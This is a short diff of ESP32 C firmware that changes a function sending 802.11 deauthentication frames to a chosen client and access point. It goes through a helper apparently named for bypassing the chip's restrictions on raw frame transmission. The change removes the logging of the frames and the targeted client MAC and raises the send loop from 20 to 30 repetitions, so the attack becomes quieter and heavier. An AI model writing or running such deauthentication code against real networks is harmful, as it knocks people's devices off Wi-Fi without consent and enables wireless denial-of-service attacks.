@@ -26,17 +26,14 @@ void send_deauth_packet(const uint8_t *ap_bssid, const uint8_t *client_mac) {
   memcpy(&deauth_frame[10], ap_bssid, 6);
   memcpy(&deauth_frame[16], ap_bssid, 6);
   // print size of deauth_frame
-  ESP_LOGI("DEAUTH", "Deauth frame size: %zu bytes", sizeof(deauth_frame));
+
   // Transmit the frame
   // Enable monitor mode
-  for (int i = 0; i < 20; i++) {
+  for (int i = 0; i < 30; i++) {
     // esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame),
     // false);
     wsl_bypasser_send_deauth_frame(ap_bssid, client_mac);
-    ESP_LOGI("DEAUTH",
-             "Sending deauth packet to client: %02X:%02X:%02X:%02X:%02X:%02X",
-             client_mac[0], client_mac[1], client_mac[2], client_mac[3],
-             client_mac[4], client_mac[5]);
+
 
     vTaskDelay(pdMS_TO_TICKS(100)); // Delay to avoid flooding
   }
